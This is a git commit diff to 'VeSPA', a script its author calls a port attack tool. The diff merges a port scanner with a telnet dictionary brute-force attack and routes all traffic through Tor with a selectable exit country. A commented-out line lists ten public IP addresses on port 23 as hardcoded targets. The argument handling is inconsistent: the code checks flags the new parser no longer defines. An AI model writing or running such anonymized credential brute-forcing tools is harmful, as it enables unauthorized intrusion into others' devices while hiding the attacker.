5a7361d1578de0f174b6411a03a03332ec4a7254
guilhermo <guilhermo.readonly@gmail.com>
2016-12-30 15:56:19 +0100

    start merging attack and scan modes

--- VeSPA.py
+++ VeSPA.py
@@ -6,17 +6,29 @@ import logging
 import traceback
 import time
 import argparse
+import socket
+import socks
 from VErySimplePortAttackToolkit.torManager import TorManager
 from VErySimplePortAttackToolkit.serviceScanner import ServiceScanner
+from VErySimplePortAttackToolkit import telnetDictionaryAttack
+
+__version__ = "0.1"
+__appName__ = "VeSPA"
 
 if __name__ == '__main__':
     
     
-    parser = argparse.ArgumentParser(description="VeSPA : the VEry Simple Port Attack tool.")
-    parser.add_argument("-d", "--dictionary-file")
-    parser.add_argument("-p","--port", type=int, help='tcp port number to scan')
-    parser.add_argument("-en","--exit-node")
-    parser.add_argument("-ts","--threads-scanner", type=int, help='number of threads for port scanner. Default is 1.')
+    parser = argparse.ArgumentParser(prog=__appName__, description="VeSPA : the VEry Simple Port Attack tool.")
+    parser.add_argument("-v",'--version', action='version', version='%(prog)s ' + __version__)
+    parser.add_argument("-a", "--attack-type", help='will only perform an attack', choices=["scan", "bruteforce", "both"], required = True)
+    parser.add_argument("-p","--port", type=int, help='tcp port number to scan', required = True)
+    parser.add_argument("-d", "--dictionary-file", help='path to a dictionary file used to bruteforce the port.')
+    #parser.add_argument("-s", "--scan", action="store_true", help='will only perform a port scan')
+    #parser.add_argument("-a", "--attack", action="store_true", help='will only perform an attack')
+    parser.add_argument("-en","--exit-node", help='exit node for the tor service. Eg : "ru" for russia')
+    parser.add_argument("-t","--nb-threads", type=int, default=1, help='max number of threads. Default is 1.')
+
+
 
   
     logger = logging.getLogger()
@@ -45,31 +57,52 @@ if __name__ == '__main__':
     
     logger.info('Start app.')
     
-    try :
+    logger.debug('Start tor')
+    torManager = TorManager('7000',args.exit_node)
+    torManager.connect() 
+            
+    if args.scan :
+        try :
+            
+            logger.debug('Init scanner')
+            serviceScan = ServiceScanner(args.port,3,args.nb_threads,'targets.csv')
+            
+            logger.debug('Start scanner')
+            serviceScan.startScan()
+            logger.debug('Scanner started')
+            
+        except:
+            logging.getLogger().error("Error occurs : " + traceback.format_exc())
+        
+        finally:
+            time.sleep(60*15)
+            
+            serviceScan.stopScan()
+            
+            time.sleep(3)
+            logger.debug('Scanners stopped')
+            torManager.disconnect()
+            
+    if args.attack :
+        try :
                
-        logger.debug('Start tor')
-        torManager = TorManager('7000',args.exit_node) #choose exit node in russia
-        torManager.connect() 
-        
-        logger.debug('Init scanner')
-        serviceScan = ServiceScanner(args.port,3,args.threads_scanner,'targets.csv')
-        
-        logger.debug('Start scanner')
-        serviceScan.startScan()
-        logger.debug('Scanner started')
-        
-    except:
-        logging.getLogger().error("Error occurs : " + traceback.format_exc())
+            
+            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 7000, True)
+            socket.socket = socks.socksocket          
+            
+            logger.debug('Init attack')
+            #serviceAttack = telnetDictionaryAttack.TelnetDictionaryAttack(loginPasswords , ["5.206.211.123:23","92.81.49.221:23","186.117.116.87:23","183.88.9.138:23","201.56.23.1:23","218.207.8.26:23","79.134.150.80:23","146.255.238.19:23","140.136.25.90:23","64.92.6.251:23"] , 11,3,10)
+            serviceAttack = telnetDictionaryAttack.TelnetDictionaryAttack(dictionary = loginPasswords , listTargets = "targets.csv" , nbThread=args.nb_threads,timeOut=3,timeOutPassword=10, targetsResultFile='targetsResults.csv')
+            
+            logger.debug('Start attack')
+            serviceAttack.startAttack()
+            logger.debug('Attack started')
+            
+        except:
+            logger.error("Error occurs : " + traceback.format_exc())
     
-    finally:
-        time.sleep(60*15)
-        
-        serviceScan.stopScan()
-        
-        time.sleep(3)
-        logger.debug('Scanners stopped')
-        torManager.disconnect()
-        
-        logger.info('Quit app.')
-        
+
+    
+    logger.info('Quit app.')
+            
         
